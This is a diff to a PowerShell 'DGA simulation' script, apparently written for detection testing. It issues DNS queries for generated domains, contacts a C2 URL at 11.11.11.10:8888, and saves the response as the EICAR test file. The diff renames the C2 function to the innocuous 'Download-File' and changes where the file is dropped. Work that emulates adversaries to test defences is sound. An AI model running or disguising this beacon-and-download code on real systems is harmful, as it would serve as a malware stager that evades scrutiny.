@@ -1,6 +1,3 @@
-# Import required modules
-Import-Module -Name Microsoft.PowerShell.Utility
-
 # Configure logging for verbose output
 $LogPath = "$PSScriptRoot\DGA_Simulation.log"
 $LogLevel = "DEBUG"
@@ -29,7 +26,7 @@ function Generate-Domain {
     return $domain
 }
 
-function Send-DnsQueries {
+function Query-Domains {
     param (
         [int]$NumQueries = 500,
         [double]$SleepTime = 0.01
@@ -40,33 +37,33 @@ function Send-DnsQueries {
             [System.Net.Dns]::GetHostEntry($domain)
             Write-Log -Message "Queried domain: $domain" -Level "INFO"
         } catch {
-            Write-Log -Message "Failed to query domain $domain: $_" -Level "WARNING"
+            Write-Log -Message "Failed to query domain: $domain" -Level "WARNING"
         }
         Start-Sleep -Milliseconds ($SleepTime * 1000)
     }
 }
 
-function Simulate-C2Communication {
+function Download-File {
     $c2Server = "http://11.11.11.10:8888/c2"
     try {
         $response = Invoke-WebRequest -Uri $c2Server -UseBasicParsing
         Write-Log -Message "C2 server response: $($response.StatusCode)" -Level "DEBUG"
         if ($response.StatusCode -eq 200) {
-            $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-            $malwarePath = "${desktopPath}\eicar.com"
+            $documentsPath = [System.Environment]::GetFolderPath('MyDocuments')
+            $malwarePath = "${documentsPath}\eicar.com"
             $response.Content | Set-Content -Path $malwarePath -Encoding Byte
-            Write-Log -Message "Malware file downloaded and placed on the desktop." -Level "INFO"
+            Write-Log -Message "Malware file downloaded and placed in the Documents folder." -Level "INFO"
         } else {
             Write-Log -Message "Unexpected response from C2 server: $($response.StatusCode)" -Level "WARNING"
         }
     } catch {
-        Write-Log -Message "Failed to communicate with C2 server: $_" -Level "ERROR"
+        Write-Log -Message "Failed to communicate with C2 server: $($_.Exception.Message)" -Level "ERROR"
     }
 }
 
 # Main execution
 Write-Log -Message "Starting DGA simulation..." -Level "INFO"
-Send-DnsQueries -NumQueries 1000 -SleepTime 0.01
-Simulate-C2Communication
+Query-Domains -NumQueries 1000 -SleepTime 0.01
+Download-File
 Write-Log -Message "DGA simulation completed." -Level "INFO"
 
